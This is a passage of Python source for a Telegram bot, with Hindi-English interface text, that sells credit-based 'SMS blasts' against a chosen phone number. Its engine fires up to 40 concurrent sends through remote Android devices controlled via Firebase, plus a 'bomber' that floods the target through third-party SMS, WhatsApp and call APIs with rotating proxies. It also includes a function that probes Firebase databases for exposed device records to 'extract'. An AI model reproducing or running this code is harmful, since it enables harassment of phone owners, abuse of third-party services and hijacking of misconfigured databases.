        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    await safe_edit(cq.message,
        f"{speed_label} <b>selected!</b>\n\n"
        f"📊 <b>STEP 4 / 4 — Cᴏᴜɴᴛ</b>\n"
        f"{SEP_THIN}\n"
        f"🔥  Oɴʟɪɴᴇ APIs   <b>{count}</b>\n"
        f"📤  Cᴀᴘᴀᴄɪᴛʏ     <b>{count * 3}</b> SMS/round{credit_info}\n"
        f"{SEP_DOT}\n"
        f"⚡ Kitne SMS bhejna hai? (number type karo)",
        reply_markup=kb([(f"❌ Cᴀɴᴄᴇʟ", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):"), parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                q(
                    f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                    f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein."
                ),
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(q(f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon..."), parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    if not devices:
        await msg.answer(q(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later."), reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

# ===================== OWNER / ADMIN SEND (same as before, quoted) =====================

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
        f"📞 <b>STEP 1 / 4 — Tᴀʀɢᴇᴛ Nᴜᴍʙᴇʀ</b>\n"
        f"{SEP_THIN}\n"
        f"Jis number pe SMS bhejna hai woh enter karo\n"
        f"<code>Format: +91XXXXXXXXXX</code>\n"
        f"{SEP_DOT}\n"
        f"<i>💡 Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):"), parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
            f"💬 <b>STEP 2 / 4 — Mᴇssᴀɢᴇ</b>\n"
            f"{SEP_THIN}\n"
            f"Jo message bhejna hai woh type karo:\n"
            f"<i>💡 Yeh text SMS mein jayega</i>"
        ),
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
            f"⚡ <b>STEP 3 / 4 — Sᴘᴇᴇᴅ Sᴇʟᴇᴄᴛ</b>\n"
            f"{SEP_THIN}\n"
            f"Kitni speed mein bhejein?\n"
            f"<i>🚀 Fast = max power | 🐢 Slow = stealth</i>"
        ),
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "owner:speed:fast": SPEED_FAST,
        "owner:speed:medium": SPEED_MEDIUM,
        "owner:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    await safe_edit(cq.message,
        f"{speed_label} <b>selected!</b>\n\n"
        f"📊 <b>STEP 4 / 4 — Cᴏᴜɴᴛ</b>\n"
        f"{SEP_THIN}\n"
        f"🔥  Oɴʟɪɴᴇ APIs   <b>{count}</b>\n"
        f"📤  Cᴀᴘᴀᴄɪᴛʏ     <b>{count * 3}</b> SMS/round\n"
        f"{SEP_DOT}\n"
        f"⚡ Kitne SMS bhejna hai? (number type karo)",
        reply_markup=kb([(f"❌ Cᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):"), parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(q(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later."), reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await safe_edit(cq.message,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
        f"📞 <b>STEP 1 / 4 — Tᴀʀɢᴇᴛ Nᴜᴍʙᴇʀ</b>\n"
        f"{SEP_THIN}\n"
        f"Jis number pe SMS bhejna hai woh enter karo\n"
        f"<code>Format: +91XXXXXXXXXX</code>\n"
        f"{SEP_DOT}\n"
        f"<i>💡 Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):"), parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(
                q(
                    f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                    f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain."
                ),
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
            f"💬 <b>STEP 2 / 4 — Mᴇssᴀɢᴇ</b>\n"
            f"{SEP_THIN}\n"
            f"Jo message bhejna hai woh type karo:\n"
            f"<i>💡 Yeh text SMS mein jayega</i>"
        ),
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
            f"⚡ <b>STEP 3 / 4 — Sᴘᴇᴇᴅ Sᴇʟᴇᴄᴛ</b>\n"
            f"{SEP_THIN}\n"
            f"Kitni speed mein bhejein?\n"
            f"<i>🚀 Fast = max power | 🐢 Slow = stealth</i>"
        ),
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "admin:speed:fast": SPEED_FAST,
        "admin:speed:medium": SPEED_MEDIUM,
        "admin:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    await safe_edit(cq.message,
        f"{speed_label} <b>selected!</b>\n\n"
        f"📊 <b>STEP 4 / 4 — Cᴏᴜɴᴛ</b>\n"
        f"{SEP_THIN}\n"
        f"🔥  Oɴʟɪɴᴇ APIs   <b>{count}</b>\n"
        f"📤  Cᴀᴘᴀᴄɪᴛʏ     <b>{count * 3}</b> SMS/round\n"
        f"{SEP_DOT}\n"
        f"⚡ Kitne SMS bhejna hai? (number type karo)",
        reply_markup=kb([(f"❌ Cᴀɴᴄᴇʟ", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):"), parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(q(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later."), reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

# ===================== BLAST ENGINE =====================

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=(
        f"💣 <b>BLAST INITIATED</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📞 Target: <code>{mask_number(number)}</code>\n"
        f"🚀 Engine warming up..."
    ))

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    q(
                        f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>\n"
                        f"Pehle woh khatam hone do ya stop karein."
                    ),
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        session.blast_data = load()
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None

    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            q(progress_text(0, 0, count, current_credits, speed_label_display)),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        # High-speed path: fire many Firebase PUTs in parallel.
        # FAST  -> up to 40 concurrent
        # MEDIUM -> 20
        # SLOW  -> 8
        if speed <= SPEED_FAST:
            concurrency = 40
        elif speed <= SPEED_MEDIUM:
            concurrency = 20
        else:
            concurrency = 8
        sem = asyncio.Semaphore(concurrency)
        jobs = []

        # Build job list: round-robin across devices/SIMs until count filled
        dev_cycle = list(devices) if devices else []
        if not dev_cycle:
            return
        idx = 0
        while len(jobs) < count:
            device = dev_cycle[idx % len(dev_cycle)]
            idx += 1
            sims = device.get("sims") or []
            sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
            sim = sim_slots[len(jobs) % len(sim_slots)]
            jobs.append((device, sim))

        async def one_job(device, sim):
            nonlocal sent_ok, sent_fail, msgs_left, last_update_time
            async with session.lock:
                if session.cancelled or msgs_left <= 0:
                    return
            async with sem:
                async with session.lock:
                    if session.cancelled or msgs_left <= 0:
                        return
                ok = await send_sms_via_device(
                    device["fb_url"], device["dev_id"], sim, number, message
                )
                async with session.lock:
                    if session.cancelled and msgs_left <= 0:
                        return
                    fb_id = device["fb_id"]
                    if ok:
                        sent_ok += 1
                        msgs_left -= 1
                        if is_regular_user:
                            deduct_credits(uid, 1, session.blast_data)
                            session.blast_data["stats"]["total_sent"] = session.blast_data["stats"].get("total_sent", 0) + 1
                            k = str(uid)
                            if k in session.blast_data["users"]:
                                session.blast_data["users"][k]["uses"] = session.blast_data["users"][k].get("uses", 0) + 1
                            session.blast_data.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                "number": number,
                                "message": message[:100],
                                "timestamp": int(time.time()),
                                "status": "sent"
                            })
                    else:
                        sent_fail += 1
                        msgs_left -= 1
                    if fb_id not in api_usage_delta:
                        api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                    api_usage_delta[fb_id]["sent" if ok else "failed"] += 1

                    now = time.time()
                    if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) >= count or session.cancelled):
                        current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                        try:
                            await progress_msg.edit_text(
                                q(progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display)),
                                reply_markup=stop_send_kb() if not session.cancelled else None,
                                parse_mode="HTML"
                            )
                        except TelegramBadRequest:
                            pass
                        last_update_time = now
                if speed > 0:
                    await asyncio.sleep(speed)

        try:
            await asyncio.gather(*(one_job(dev, sim) for dev, sim in jobs))
        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = session.blast_data if session.blast_data else load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)
    else:
        d_final = session.blast_data if session.blast_data else load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    _sms_rate = f"{int(sent_ok*100/(sent_ok+sent_fail)) if (sent_ok+sent_fail)>0 else 0}%"
    _sms_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    _msg_full = (message[:300] + "...") if len(message) > 300 else message
    chan_log = (
        f"🚀 <b>SMS BLAST LOG</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Name:</b>     {u_name}\n"
        f"🌐 <b>Username:</b> {u_uname}\n"
        f"🆔 <b>User ID:</b>  <code>{uid}</code>\n"
        f"🕐 <b>Time:</b>     <code>{_sms_time}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📞 <b>Target:</b>   <code>{number}</code>\n"
        f"💬 <b>Message:</b>\n<code>{_msg_full}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Sent:</b>     <b>{sent_ok}</b>  /  <b>{count}</b> requested\n"
        f"❌ <b>Failed:</b>   <b>{sent_fail}</b>\n"
        f"🎯 <b>Rate:</b>     <b>{_sms_rate}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"📊 <b>Status:</b>   {'🛑 STOPPED BY USER' if was_cancelled else '✅ COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0:
        icon = em(EMOJI_WARNING, "⚠️")
    else:
        icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"

    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]

    try:
        await progress_msg.edit_text(
            q(
                f"{icon} <b>BLAST COMPLETE</b>{stopped_text}\n"
                f"{SEP_THICK}\n"
                f"📞  Tᴀʀɢᴇᴛ    <code>{mask_number(number)}</code>\n"
                f"💬  Mᴇssᴀɢᴇ   <code>{message[:40]}{'...' if len(message)>40 else ''}</code>\n"
                f"{SEP_DOT}\n"
                f"✅  Sᴇɴᴛ      <b>{glow_num(sent_ok)}</b>\n"
                f"❌  Fᴀɪʟᴇᴅ    <b>{glow_num(sent_fail)}</b>\n"
                f"🎯  Rᴀᴛᴇ      <b>{int(sent_ok*100/(sent_ok+sent_fail)) if (sent_ok+sent_fail)>0 else 0}%</b>\n"
                f"🔥  APIs ᴜsᴇᴅ <b>{len(api_usage_delta)}</b>"
                f"{duration_text}{credit_text}"
            ),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id

    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True

    await cq.answer("🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)

    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await safe_edit(cq.message,
            f"🛑 <b>STOPPING BLAST...</b>\n"
            f"{SEP_THIN}\n"
            f"✅  Sᴇɴᴛ sᴏ ꜰᴀʀ  <b>{current_sent}</b>\n"
            f"❌  Fᴀɪʟᴇᴅ       <b>{current_failed}</b>\n"
            f"{SEP_DOT}\n"
            f"<i>⏳ Current batch finish hone ke baad ruk jayega...</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass

# ===================== API BOMBER ENGINE =====================

def _normalize_phone(p: str) -> str:
    p = p.strip().replace(" ", "").replace("-", "")
    if p.startswith("+91"):
        p = p[3:]
    elif p.startswith("91") and len(p) > 10:
        p = p[2:]
    return p

def _next_proxy() -> str | None:
    global _PROXY_IDX
    if not PROXY_LIST:
        return None
    with _PROXY_LOCK:
        p = PROXY_LIST[_PROXY_IDX % len(PROXY_LIST)]
        _PROXY_IDX += 1
        return p

def _default_cost(api_type: str) -> int:
    return {"SMS": 1, "WhatsApp": 2, "Call": 3}.get(api_type, 1)

def _api_is_usable(name: str, d: dict) -> bool:
    enabled = d.get("api_enabled", {})
    if name in enabled and enabled[name] is False:
        return False
    health = d.get("api_health", {}).get(name, {})
    until = int(health.get("disabled_until", 0) or 0)
    if until and until > int(time.time()):
        return False
    return True

def _record_api_result(name: str, ok: bool):
    def _mut(dd):
        health = dd.setdefault("api_health", {})
        h = health.setdefault(name, {"fails": 0, "last_fail": 0, "disabled_until": 0})
        if ok:
            h["fails"] = 0
        else:
            h["fails"] = int(h.get("fails", 0)) + 1
            h["last_fail"] = int(time.time())
            if h["fails"] >= API_DISABLE_AFTER_FAILS:
                h["disabled_until"] = int(time.time()) + API_DISABLE_DAYS * 86400
                h["fails"] = 0
    atomic_update(_mut)

async def hit_bomb_api(api: dict, phone: str) -> tuple:
    """Return (ok: bool, api_name: str, error: str|None). Retries 5xx/429/network."""
    name = api.get("name", "unknown")
    method = (api.get("method") or "POST").upper()
    headers = {
        "User-Agent": api.get("ua") or DEFAULT_UA,
        "Accept": "application/json",
    }
    headers.update(api.get("headers") or {})
    url_val = api.get("url")
    data_fn = api.get("data")
    success_check = api.get("success_check")
    try:
        url = url_val(phone) if callable(url_val) else url_val
        body = data_fn(phone) if callable(data_fn) else data_fn
        if url and "PLACEHOLDER" in str(url):
            return False, name, "placeholder"
        timeout = aiohttp.ClientTimeout(total=6)
        last_err = None
        for attempt in range(3):
            proxy = _next_proxy()
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    kwargs = {"headers": headers}
                    if proxy:
                        kwargs["proxy"] = proxy
                    if method == "GET":
                        async with session.get(url, **kwargs) as resp:
                            status = resp.status
                            txt = (await resp.text())[:500]
                    else:
                        if isinstance(body, str) and headers.get("Content-Type", "").startswith("application/json"):
                            kwargs["data"] = body
                        else:
                            kwargs["json"] = json.loads(body) if isinstance(body, str) else body
                        async with session.post(url, **kwargs) as resp:
                            status = resp.status
                            txt = (await resp.text())[:500]
                if status in (429, 500, 502, 503, 504) and attempt < 2:
                    await asyncio.sleep(0.5 if attempt == 0 else 1.5)
                    last_err = f"HTTP {status}"
                    continue
                ok_status = status in (200, 201, 204)
                body_ok = True
                if success_check and callable(success_check):
                    try:
                        body_ok = bool(success_check(txt))
                    except Exception:
                        body_ok = True
                else:
                    low = (txt or "").lower()
                    if any(k in low for k in FAIL_KEYWORDS):
                        body_ok = False
                ok = ok_status and body_ok
                return ok, name, None if ok else (last_err or f"HTTP {status}")
            except Exception as e:
                last_err = str(e)[:80]
                if attempt < 2:
                    await asyncio.sleep(0.5 if attempt == 0 else 1.5)
                    continue
                return False, name, last_err
        return False, name, last_err or "retry_exhausted"
    except Exception as e:
        return False, name, str(e)[:80]

async def probe_and_extract(project_id: str) -> dict | None:
    """Try multi-region RTDB shallow probe. Return {url, label} or None."""
    pid = project_id.strip().rstrip("/")
    if "://" in pid:
        # already a URL — probe directly
        base = pid.rstrip("/")
        if not base.endswith(".json"):
            probe = base + "/clients.json?shallow=true"
        else:
            probe = base
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(probe, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if r.status == 200:
                        txt = (await r.text()).strip()
                        if txt and txt not in ("null", "", "{}"):
                            clean = base.replace("/clients.json?shallow=true", "").replace("/clients.json", "")
                            return {"url": clean, "label": f"{pid.split('/')[-1][:24]}_extracted"}
        except Exception:
            pass
        return None
    # strip common suffixes if user pasted full host
    for suf in [".firebaseio.com", "-default-rtdb.firebaseio.com",
                "-default-rtdb.europe-west1.firebasedatabase.app",
                "-default-rtdb.asia-southeast1.firebasedatabase.app"]:
        if pid.endswith(suf):
            pid = pid[: -len(suf)]
            break
    for tpl in RTDB_REGIONS:
        host = tpl.format(p=pid)
        probe = f"https://{host}/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(probe, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if r.status == 200:
                        txt = (await r.text()).strip()
                        if txt and txt not in ("null", "", "{}"):
                            return {"url": f"https://{host}", "label": f"{pid}_extracted"}
        except Exception:
            continue
    return None

def _apis_for_mode(mode: str, d: dict = None) -> list:
    d = d if d is not None else load()
    if mode == "sms":
        pool = [a for a in BOMB_APIS if a["type"] == "SMS"]
    elif mode == "wa":
        pool = [a for a in BOMB_APIS if a["type"] == "WhatsApp"]
    elif mode == "call":
        pool = [a for a in BOMB_APIS if a["type"] == "Call"]
    else:
        pool = list(BOMB_APIS)
    return [a for a in pool if _api_is_usable(a.get("name", ""), d)]

def _today_key() -> str:
    return date.today().isoformat()

def _get_daily_count(uid: int, d: dict) -> int:
    day = _today_key()
    return int(d.get("daily_bomb_count", {}).get(day, {}).get(str(uid), 0) or 0)

def _inc_daily_count(uid: int, n: int):
    def _mut(dd):
        day = _today_key()
        bucket = dd.setdefault("daily_bomb_count", {}).setdefault(day, {})
        bucket[str(uid)] = int(bucket.get(str(uid), 0) or 0) + n
        # prune old days keep last 3
        keys = sorted(dd["daily_bomb_count"].keys())
        for k in keys[:-3]:
            dd["daily_bomb_count"].pop(k, None)
    atomic_update(_mut)

def _mode_cost(mode: str, d: dict) -> int:
    costs = d.get("mode_costs") or DEFAULT_MODE_COSTS
    return int(costs.get(mode, DEFAULT_MODE_COSTS.get(mode, 1)))

async def run_bomb_engine(bot: Bot, msg: Message, uid: int, number: str, message: str, mode: str, count: int, speed: float):
    """Parallel bomb engine — SMS / WA / Call / All. Live per-API progress + health + stall guard."""
    phone = _normalize_phone(number)
    d0 = load()
    apis = _apis_for_mode(mode, d0)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d0)

    use_firebase = mode in ("sms", "call", "all") and bool(devices)
    concurrency = 40 if speed <= SPEED_FAST else (20 if speed <= SPEED_MEDIUM else 8)
    sem = asyncio.Semaphore(concurrency)

    jobs = []
    api_jobs_n = count
    fb_jobs_n = 0
    if use_firebase and devices:
        fb_jobs_n = max(1, int(count * 0.4))
        api_jobs_n = count - fb_jobs_n

    for i in range(api_jobs_n):
        if not apis:
            break
        jobs.append(("api", apis[i % len(apis)]))
    for i in range(fb_jobs_n):
        dev = devices[i % len(devices)]
        if mode == "call":
            jobs.append(("fb_call", dev))
        elif mode == "sms":
            jobs.append(("fb_sms", dev))
        else:
            jobs.append(("fb_sms" if i % 2 == 0 else "fb_call", dev))

    if not jobs:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} No APIs / devices available for this mode."), parse_mode="HTML")
        return

    random.shuffle(jobs)
    total = len(jobs)

    api_sent = defaultdict(int)
    api_fail = defaultdict(int)
    type_sent = defaultdict(int)  # SMS/WA/CALL
    type_fail = defaultdict(int)
    sent_ok = 0
    sent_fail = 0
    start_time = time.time()
    last_progress_ts = start_time
    consecutive = defaultdict(int)  # api_name -> consecutive hits on this number
    speed_label = "🚀 FAST" if speed <= SPEED_FAST else ("⚡ MEDIUM" if speed <= SPEED_MEDIUM else "🐢 SLOW")
    mode_label = {"sms": "SMS", "wa": "WhatsApp", "call": "Call", "all": "ALL"}.get(mode, mode.upper())
    cost_per = _mode_cost(mode, d0)

    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid) or UserSession(uid)
        session.cancelled = False
        session.sent = 0
        session.failed = 0
        session.start_time = start_time
        session.number = number
        USER_SESSIONS[uid] = session

    progress_msg = await msg.answer(
        q(progress_text(0, 0, total, credits=None, speed_label=speed_label)),
        reply_markup=stop_send_kb(),
